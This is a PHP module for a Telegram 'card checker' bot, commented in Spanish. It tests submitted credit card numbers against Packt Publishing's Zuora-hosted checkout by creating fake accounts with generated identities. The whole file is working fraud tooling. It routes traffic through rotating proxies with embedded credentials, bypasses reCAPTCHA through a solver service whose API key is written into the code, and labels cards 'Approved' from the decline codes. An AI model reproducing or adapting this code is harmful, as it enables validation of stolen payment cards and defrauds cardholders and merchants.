<?php

$gatewayname="zo";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Zuora_Chase (".'$zo'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    
 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    
    $userAgent = new userAgent();
    $userAgent = $userAgent->generate();
    
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//


$cookie = uniqid();

$socks5 = "gw.dataimpulse.com:823";
$rotate = "b097452cc0d2c2bcc268__cr.us:7580f00952ea0161";

$proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 $response =  CurlX::Get(
    "https://www.packtpub.com/checkout/subscription/monthly-packt-subscription-vz22?freeTrial",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
    ],
    $cookie,
    $proxies,
    $userAgent
);

    sleep(rand( 0,5));
    $req =  CurlX::Get('https://dadbol.tech/apis/Recaptchabypass.php?type=v3&anchor_url=' . urlencode("https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeAHSgUAAAAAKsn5jo6RUSTLVxGNYyuvUcLMe0_&co=aHR0cHM6Ly93d3cucGFja3RwdWIuY29tOjQ0Mw..&hl=en&v=zIriijn3uj5Vpknvt_LnfNbF&size=invisible&cb=jdg3uzmvxc4x"));
    $token =  CurlX::ParseString($req->body, ',"Recaptchav3 Token":"', '"');
$response =  CurlX::Post(
    "https://www.packtpub.com/api/register",
    'username='.urlencode($email).'&password='.urlencode($password).'&firstName='.$firstName.'&lastName='.$lastName.'&passwordConfirmation='.urlencode($password).'&recaptcha='.$token.'&marketingPool=Subscriber',
    [
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.packtpub.com',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies,
    $userAgent
);sleep(rand(0,5));

$response =  CurlX::Post(
    "https://www.packtpub.com/api/checkout/address",
    'line1='.urlencode($street).'&line2=&city='.urlencode($city).'&postalCode='.$zip.'&country=United+States&state='.urlencode($state).'',
    [
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.packtpub.com',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies,
    $userAgent
);
sleep(rand(0,5));
$response =  CurlX::Get(
    "https://www.packtpub.com/api/checkout/zuora/payment-details?currency=USD&zouraIdentifier=monthly-packt-subscription-vz22",
    [
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/json',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies,
    $userAgent
);
$key= CurlX::ParseString($response->body,'"key":"','"');
$signature= CurlX::ParseString($response->body,'"signature":"','"');
$token= CurlX::ParseString($response->body,'"token":"','"');
$tenantId= CurlX::ParseString($response->body,'"tenantId":"','"');
$id= CurlX::ParseString($response->body,'"id":"','"');

sleep(rand(0,5));
$response =  CurlX::Get(
    "https://www.zuora.com/apps/PublicHostedPageLite.do?method=requestPage&host=https%3A%2F%2Fwww.packtpub.com%2Fcheckout%2Fsubscription%2Fmonthly-packt-subscription-vz22%3FfreeTrial&fromHostedPage=true&jsVersion=1.3.1&field_creditCardHolderName=".$firstName."%20".$lastName."&field_creditCardCountry=United%20States&field_creditCardState=".urlencode($state)."&field_creditCardAddress1=".urlencode($street)."&field_creditCardAddress2=&field_creditCardCity=".urlencode($city)."&field_creditCardPostalCode=".$zip."&field_email=".urlencode($email)."&id=".$id."&locale=en&style=inline&submitEnabled=true&tenantId=".urlencode($tenantId)."&token=".urlencode($token)."&signature=".urlencode($signature)."&zlog_level=warn",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'upgrade-insecure-requests: 1',
    ],
    $cookie,
    $proxies,
    $userAgent
);
 $field_key= CurlX::ParseString($response->body,'name="field_key" value="','"');
 $xjd28s_6sk= CurlX::ParseString($response->body,'id="xjd28s_6sk" value="','"');
 $signature= CurlX::ParseString($response->body,'id="signature" value="','"');
 $token= CurlX::ParseString($response->body,'id="token" value="','"');
 $id= CurlX::ParseString($response->body,'id="id" value="','"');
 $tenantId= CurlX::ParseString($response->body,'id="tenantId" value="','"');
 $encrypt_zoura = $bot->encrypt_data($creditcard,$field_key);

$solver = new CapSolver('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');

$maxRetries = 3;
$attempts = 0;
$solved = false;


while ($attempts < $maxRetries && !$solved) {
    try {
        // Resolver el captcha
        $solution = $solver->recaptchav2('ReCaptchaV3EnterpriseTaskProxyless', [
            "websiteURL"=> "https://www.zuora.com",
            "websiteKey"=> "6Lck6VApAAAAAILZAI5AxiMKaoZM4p1iPLbGrQxP",
            "apiDomain"=> "www.recaptcha.net",
            "pageAction"=> "HPM_SUBMIT",
            "proxy" => "http://b097452cc0d2c2bcc268__cr.us:7580f00952ea0161@gw.dataimpulse.com:823"
        ]);

        if (isset($solution['gRecaptchaResponse'])) {
            $CaptchaResponse = $solution['gRecaptchaResponse'];
             "Respuesta del Captcha: $CaptchaResponse\n";
            $solved = true;
        } else {
            throw new Exception("No se obtuvo un token válido. Respuesta completa: " . json_encode($solution));
        }
    } catch (Exception $e) {
        $attempts++;
         "Intento {$attempts} fallido: " . $e->getMessage() . "\n";
        if ($attempts >= $maxRetries) {
             "Se alcanzó el número máximo de reintentos.\n";
        }
    }
}
sleep(rand(0,5));
$response =  CurlX::Post(
    "https://www.zuora.com/apps/PublicHostedPageLite.do",
     'method=submitPage&id='.urlencode($id).'&tenantId='.urlencode($tenantId).'&token='.urlencode($token).'&signature='.urlencode($signature).'&paymentGateway=&field_authorizationAmount=&field_screeningAmount=&field_currency=&field_key='.urlencode($field_key).'&field_style=inline&jsVersion=1.3.1&field_submitEnabled=true&field_callbackFunctionEnabled=&field_signatureType=&host=https%3A%2F%2Fwww.packtpub.com%2Fcheckout%2Fsubscription%2Fmonthly-packt-subscription-vz22%3FfreeTrial&encrypted_fields=%23field_ipAddress%23field_creditCardNumber%23field_cardSecurityCode%23field_creditCardExpirationMonth%23field_creditCardExpirationYear&encrypted_values='.urlencode($encrypt_zoura).'&customizeErrorRequired=&fromHostedPage=true&isGScriptLoaded=true&is3DSEnabled=&checkDuplicated=&captchaRequired=true&captchaSiteKey=6Lck6VApAAAAAILZAI5AxiMKaoZM4p1iPLbGrQxP&field_mitConsentAgreementSrc=&field_mitConsentAgreementRef=&field_mitCredentialProfileType=&field_agreementSupportedBrands=&paymentGatewayType=&paymentGatewayVersion=&is3DS2Enabled=&cardMandateEnabled=&zThreeDs2TxId=&threeDs2token=&threeDs2Sig=&threeDs2Ts=&threeDs2OnStep=&threeDs2GwData=&doPayment=&storePaymentMethod=&documents=&xjd28s_6sk='.urlencode($xjd28s_6sk).'&pmId=&button_outside_force_redirect=false&browserScreenHeight=1500&browserScreenWidth=1750&g-recaptcha-response='.$CaptchaResponse.'&field_passthrough1=&field_passthrough2=&field_passthrough3=&field_passthrough4=&field_passthrough5=&field_passthrough6=&field_passthrough7=&field_passthrough8=&field_passthrough9=&field_passthrough10=&field_passthrough11=&field_passthrough12=&field_passthrough13=&field_passthrough14=&field_passthrough15=&field_accountId=&field_gatewayName=&field_deviceSessionId=&field_ipAddress=&field_useDefaultRetryRule=&field_paymentRetryWindow=&field_maxConsecutivePaymentFailures=&field_creditCardHolderName=alec+torres&field_creditCardNumber=&field_creditCardType=Visa&field_creditCardExpirationMonth=&field_creditCardExpirationYear=&field_cardSecurityCode=&encodedZuoraIframeInfo=eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vd3d3Lnp1b3JhLmNvbS9hcHBzLyIsImZvcm1XaWR0aCI6NTM5LCJmb3JtSGVpZ2h0Ijo0NjMsImxheW91dFN0eWxlIjoiYnV0dG9uSW5zaWRlIiwienVvcmFKc1ZlcnNpb24iOiIxLjMuMSIsImZvcm1GaWVsZHMiOlt7ImlkIjoiZm9ybS1lbGVtZW50LWNyZWRpdENhcmRUeXBlIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkTnVtYmVyIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkRXhwaXJhdGlvblllYXIiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRIb2xkZXJOYW1lIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQ291bnRyeSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZFN0YXRlIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQWRkcmVzczEiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRBZGRyZXNzMiIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZENpdHkiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRQb3N0YWxDb2RlIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1waG9uZSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtZW1haWwiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX1dfQ%3D%3D',
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies,
    $userAgent
);


 //==================[Manejo de los mensajes]======================//
$errormessage = CurlX::ParseString($response->body,'"errorMessage":"','"');
$code = CurlX::ParseString($response->body,'"errorCode":"','"');

if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 

 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//

 if($errormessage == "Transaction declined.201 - Decline for CVV2 Failure"){
    
    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            "$errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
       " $errormessage",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
